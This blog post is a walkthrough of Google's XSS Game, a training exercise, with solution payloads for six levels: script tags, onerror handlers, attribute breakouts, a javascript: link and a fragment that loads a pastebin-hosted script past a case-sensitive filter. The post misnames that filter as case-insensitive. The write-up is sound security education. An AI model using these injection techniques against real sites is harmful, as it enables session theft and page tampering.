---
layout: post
title: "Google's XSS Game"
published: true
tags: [hacking, research] # documentation, news, hacking, OverTheWire, software, research, dev, running
image:
  feature:
  teaser:
  credit:
---

According to the [OWASP](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)):

> Cross-Site Scripting (XSS) attacks are a type of injection,
>     in which malicious scripts are injected into otherwise benign and trusted web sites.
> XSS attacks occur when an attacker uses a web application to send malicious code,
>     generally in the form of a browser side script, to a different end user.
> Flaws that allow these attacks to succeed are quite widespread and occur anywhere
>     a web application uses input from a user within the output it generates without validating or encoding it.

> An attacker can use XSS to send a malicious script to an unsuspecting user.
> The end user’s browser has no way to know that the script should not be trusted,
>     and will execute the script.
> Because it thinks the script came from a trusted source, the malicious script can access any cookies,
>     session tokens, or other sensitive information retained by the browser and used with that site.
> These scripts can even rewrite the content of the HTML page.

According to Google:

> Cross-site scripting (XSS) bugs are one of the most common and dangerous types of vulnerabilities in Web applications.
> These nasty buggers can allow your enemies to steal or modify user data in your apps and you must learn to dispatch them, pronto!
>
> At Google, we know very well how important these bugs are.
> In fact, Google is so serious about finding and fixing XSS issues that we are paying mercenaries up to $7,500
> for dangerous XSS bugs discovered in our most sensitive products.
>
> In this training program, you will learn to find and exploit XSS bugs.
> You'll use this knowledge to confuse and infuriate your adversaries by preventing such bugs from happening in your applications.

This post details some thoughts on (and solutions for) [Google's XSS Game](https://xss-game.appspot.com/).

## Level 1: Hello, world of XSS

In [level 1](https://xss-game.appspot.com/level1) we are told that the page is vulnerable to injecting code.
*The core issue is not escaping user input before rendering it on the page.*
To exercise the vulnerability, wrap a javascript `alert()` within a  `<script>` element
    and insert the element into the query box:

```javascript
<script>alert('Injected!');</script>
```

## Level 2: Persistence is key

In [level 2](https://xss-game.appspot.com/level2) we are told that the page is once again vulnerable to injecting code.
We can inject HTML (which is clear from the stylized text in the default comment and other basic tests),
    but this time we can't directly insert a `<script>` element to inject executable Javascript code
    (since the browser won't execute scripts added *after* the page has loaded).
We can, however, add an HTML element that will cause a function to be executed in certain instances.
For example, we can insert an image that tries to load an image (that won't exist...)
    and specify an `onerror` function that will be executed... when there is an error.

*The core issue here, again, comes back to sanitizing inputs.
My understanding is that a common approach to address this issue is to sanitize user inputs,
    removing attempts by users to specify, e.g., their own error-handling functionality.
Better yet, filters/sanitization schemes should use very strict white lists to only allow certain elements,
    rather than trying to handle all possible user inputs.
Further, on white-listed elements,
    there should be a white list for allowed attributes - or do not allow style attributes at all!*

To exercise the vulnerability, post an `<img>` tag and make the `onerror` attribute invoke an `alert()`:

```html
<img src="image.gif" onerror="alert('imgInjection!')">
```

If we were more nefarious, we could specify some other function to call as a result of the error.

## Level 3: That sinking feeling...

In [level 3](https://xss-game.appspot.com/level3) we are told that the page is vulnerable to injecting code.
To make things more difficult, this time there is no explicit input box.
We can, however, use the URL to inject input into the webpage.

If you read the source you'll notice that the user-controlled input specifies a number which is used to select an image.
If you think about it a little, what we have is here is the ability to inject content *into* an image tag.
This is quite similar to the previous exercise!
In this situation, however, what we want to do is just add the `onerror` attribute to the `img` tag
    where our user input is injected.

The only remaining tricky aspect of this problem is that our input is injected into an attribute -
    the `src` attribute to be specific.
What we can do is terminate the string, *then* add the `onerror` attribute (with a Javascript `alert()`).
In my example,
    I intentionally add content that will render an invalid image in order to trigger the `onerror` function call
    (i.e., just the number 1, instead of something like "1.jpg" which is an image that exists).  
I follow the number by a single quote - this terminates the `src` attribute string.
Next, I add the `onerror` attribute with an alert.

A complete URL could look like this:

```
https://xss-game.appspot.com/level3/frame#1' onerror='alert("imgOnErrorXSSInjection!");' id='
```

Which yields an image tag that looks like this:

```html
<img src='/static/level3/cloud1' onerror='alert("imgOnErrorXSSInjection!");' id='.jpg' />
```

Note that I added the `id='` at the end to include the dangling ".jpg" in the element's attributes.
This wasn't necessary to complete the challenge,
    but it has the added bonus that there is no incomplete HTML rendered on the page,
    which might alert someone to the fact that something fishy is going on.

## Level 4: Context matters

In [level 4](https://xss-game.appspot.com/level4) we are warned that

> [e]very bit of user-supplied data must be correctly escaped for the context of the page in which it will appear.
> This level shows why.

At this point, the ability to identity where and how to inject code seems to be getting easier.

This level features a timer which will cause an alert to be executed when the timer expires.
Play with the page a bit to verify this for yourself.
Seems straightforward and hard to mess up...
The catch: the user can control the timer duration.

In reading the source code (`timer.html`) we can observe that the user-specified value for the timer
    is indeed simply rendered directly into a string.
Specifically, see line 21:

```html
<img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
```

That's right, the `{{ timer }}` part is literally saying take the value of the variable `timer` and
    plop it down right here as the argument(s) to `startTimer`.
Since this equates to writing text into the page and controlling what is written into the `img` tag,
    I've chosen to terminate the `startTimer()` call and then inject a call to `alert()`.
Specifically, my solution to this problem is to inject a string that
    (1) completes the `startTimer` code, and
    (2) follows-up with an alert that we craft (which symbolizes any function call an attacker may want to perform).
Here's my solution:

```
1'); alert('xssTimer
```

If it isn't completely clear, let me show *my* string in the context of the `img` tag in which the string will be added.
Notice that everything in the `{{ timer }}` text is replaced with my crafted string.

```html
<img src="/static/loading.gif" onload="startTimer('1'); alert('xssTimer');" />
```

## Level 5: Breaking protocol

[Level 5](https://xss-game.appspot.com/level5) is interesting.
You don't directly inject new elements (e.g., `img` tags) into the DOM as we have in past challenges.
Instead, we'll exploit how elements in the DOM rely on URL parameters.

Specifically, let's direct our attention to the `signup.html` page.
By reading the source code you'll notice that the `Next >>` button uses
    the value of `next` (in the query string of the URL) to set its target (`href="..."`).
For example, by default, when you navigate to the `signup.html` page (by clicking 'Sign up' on the welcome page),
    we see a URL that looks like this:

```
https://xss-game.appspot.com/level5/frame/signup?next=confirm
```

The part of the URL that specifies `next=confirm` is where `next` is set in the source code of `signup.html`;
    to see this, check out line 15:

```html
<a href="{{ next }}">Next >></a>
```

Go ahead and play with the page (inspect variables in the debugger,
        change the value from confirm to something like "welcome") -
    do whatever you need to do to convince yourself that this is what is happening.
Given that we can tweak the URL query parameters and cause the value of `next` to become the target of an `href`,
    we'll set the value of `next` to be executable javascript code.
Specifically, from the *'javascript' resource identifier scheme* described in [this IETF draft](https://tools.ietf.org/html/draft-hoehrmann-javascript-scheme-00),
>   The 'javascript' resource identifier scheme allows to encode script
>   code in a resource identifier in a way similar to the 'data' scheme,
>   but with extended semantics.

Or put into simpler terms, if we control the value of an the `href` in an anchor tag,
    we could use `javascript:doSomething()` to inject some code that will run.
Generally speaking, this will look like the following:

```html
<a href='javascript:doSomething()'>...</a>
```

So in our situation, we can use something like `javascript:alert()` to trigger an alert
    when some anchor tag is clicked.
Thus, my complete URL for level 5:

```
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert('xssNEXT!')
```

## Level 6: Follow the Rabbit

[Level 6](https://xss-game.appspot.com/level6) deals with issues around dynamically loading content
    such as javascript libraries based on values of URL parameters or part of the `location.hash` value.
As the game makers claim (and I'm liable to believe...),
    it is difficult to get this sort of dynamic loading behavior right.
This challenge features one prominent example of how this sort of behavior can go wrong...

Specifically, the issue we'll exploit is rooted in the custom regular expression
    which is meant to prevent external files being loaded.
Our objective: to load an external file that will execute an `alert()`.

For this challenge I used `pastebin.com` to host my external file: [alert](https://pastebin.com/raw/vkVePWY5).

Regarding how the code for this level works,
note that the file that is loaded depends on the text that comes *after* the `#` symbol in the URL.
We can try to specify our external file (`https://pastebin.com/raw/vkVePWY5`),
    but this won't work because of the regular expression that prevents URLs that contain any URL starting with `https`
    (see lines 20-25):

```javascript
// This will totally prevent us from loading evil URLs!
if (url.match(/^https?:\/\//)) {
  setInnerText(document.getElementById("log"),
    "Sorry, cannot load a URL containing \"http\".");
  return;
}
```

The problem with this regular expression is that it is case insensitive.
Meaning it only checks that the URL doesn't contain a lowercase version of `http...`
Thus, by changing the case of some of the letters in `http` or `https` - for example, to be `HTTPS`,
    we can "pass" the regular expression check and fool the script to load our external file.
My complete URL looks like this:

```
https://xss-game.appspot.com/level6/frame#HTTPS://pastebin.com/raw/vkVePWY5
```

# Wrapping up

The game wasn't all that long but I found it to be quite insightful!
The next question I have, however, is: *what are the best (read: state-of-the-art) techniques for preventing XSS?*
Google has some follow-up documentation that they link:
    [Google Application Security | Cross-site scripting](https://www.google.com/about/appsecurity/learning/xss/index.html).
I suppose it's time to give that a read :D
